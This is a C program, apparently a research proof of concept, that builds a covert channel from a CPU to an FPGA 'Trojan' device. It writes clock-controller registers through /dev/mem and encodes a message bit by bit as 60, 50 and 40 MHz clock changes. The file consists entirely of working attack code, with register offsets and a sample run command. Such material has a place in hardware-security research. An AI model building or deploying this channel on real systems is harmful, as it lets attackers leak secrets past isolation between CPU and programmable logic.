/*   NO RIGHTS RETAINED.
 *
 *   Permission is granted to copy, distribute and/or modify this document
 *   under the terms of the GNU Free Documentation License, Version 1.3
 *   or any later version published by the Free Software Foundation;
 *   with no Invariant Sections, no Front-Cover Texts, and no Back-Cover Texts.
 *
 *   THIS SOFTWARE IS PROVIDED 
 *  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 *  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 *  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 *  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 *  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 *  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 *  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 *  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 *  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 *  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <stdbool.h>

int nanosleep(const struct timespec *req, struct timespec *rem);


void write_to_register(unsigned int * reg, int val)
{
	struct timespec t;
    t.tv_sec = 0;
    t.tv_nsec = 200L;
	*reg = val;
	nanosleep(&t , NULL);
}

//base_addr == pio_addr used during the creation of the design

//command example = /mnt/attackCpu 0x2c200000 0x1C010000 0x154786fa 20000000
 
int main(int argc, char *argv[])
{

	char * data_to_transfer = "This is a covert secret message!";
	char byte_to_send;
	bool bit_to_send;
	int i=0,j=0;

	if (argc < 5) {
		printf("Usage: %s <base_addr_of_TrojanDevice> <base_addr_of_RVCTRL> <word_to_send> <cpuTimeBitSeparator> \n", argv[0]);
		return 0;
	}

	off_t offsetTrajnDeviceReg = strtoul(argv[1], NULL, 0);
	off_t offsetOfRvCtrl = strtoul(argv[2], NULL, 0);
	//int word_to_send = (int)strtoul(argv[3], NULL, 0);
    int cpuTimeBitSeparator = (int)strtoul(argv[4], NULL, 0);


	int fd = open("/dev/mem",O_RDWR|O_SYNC);
	if(fd < 0)
	{
		printf("Can't open /dev/mem\n");
		return 1;
	}

	unsigned int *TrajnDeviceReg = (unsigned int *) mmap(0, sysconf(_SC_PAGESIZE), PROT_READ|PROT_WRITE, MAP_SHARED, fd, offsetTrajnDeviceReg);
	if(TrajnDeviceReg == NULL)
	{
		printf("Can't mmap\n");
		return 1;
	}

	unsigned int *RvCtrl = (unsigned int *) mmap(0, sysconf(_SC_PAGESIZE), PROT_READ|PROT_WRITE, MAP_SHARED, fd, offsetOfRvCtrl);
	if(RvCtrl == NULL)
	{
		printf("Can't mmap RvCtrl registers\n");
		return 1;
	}

	//setting the TrajnDevice for the device attack (send data from CPU to device using frequency modulation)
	unsigned int *deviceFreq0Reg = (TrajnDeviceReg + 4);
    unsigned int *deviceFreq1Reg = (TrajnDeviceReg + 5); //no
    unsigned int *deviceFreqSeparatorReg = (TrajnDeviceReg + 6);
    unsigned int *cpuTimeBitSeparatorReg = (TrajnDeviceReg + 7); //no
    unsigned int *cpuAttackEnabledReg = (TrajnDeviceReg + 8);
    unsigned int *startAttackReg = (TrajnDeviceReg + 9); //no

	//The main two registers of RVCTRL used to configure the TrojanDevice clock :
	unsigned int *CfgData = (RvCtrl + 40);
	unsigned int *CfgCtrl = (RvCtrl + 41);

	//Frequency used to send bit 1 to the trojanDevice 60MHz (0x3C)
	//Frequency used to send bit 0 to the trojanDevice 50MHz (0x32)
	//Frequency used to separate between two succesives bits 40MHz (0x28)
    write_to_register(deviceFreq1Reg, 0x3C);
    write_to_register(deviceFreq0Reg, 0x32);
    write_to_register(deviceFreqSeparatorReg, 0x28);
    write_to_register(cpuTimeBitSeparatorReg, cpuTimeBitSeparator);
    write_to_register(cpuAttackEnabledReg, 0x1);
    write_to_register(startAttackReg, 0x1);

	for(i=0;i<strlen(data_to_transfer);i++)
	    {
	    	byte_to_send = data_to_transfer[i];
	  	    for(j=0;j<8;j++)
	  		{
		  		bit_to_send = byte_to_send & 1;
		  		byte_to_send = byte_to_send >> 1;

	  	    	if(bit_to_send){
	  	    		write_to_register(CfgData,  0x3938700); //60M
	  	  		write_to_register(CfgCtrl, 0xC0110009); //Device's clock domain ID
	  	    	}
	  	    	else{
	  	    		write_to_register(CfgData, 0x2FAF080);  //50M
	  	    		write_to_register(CfgCtrl, 0xC0110009); //Device's clock domain ID
	  	    	}
	  			write_to_register(CfgData, 0x2625A00);  //40M
	  			write_to_register(CfgCtrl, 0xC0110009); //Device's clock domain ID
	  	    }
	    }

	write_to_register(cpuAttackEnabledReg, 0x0);
	
	return 0;
}
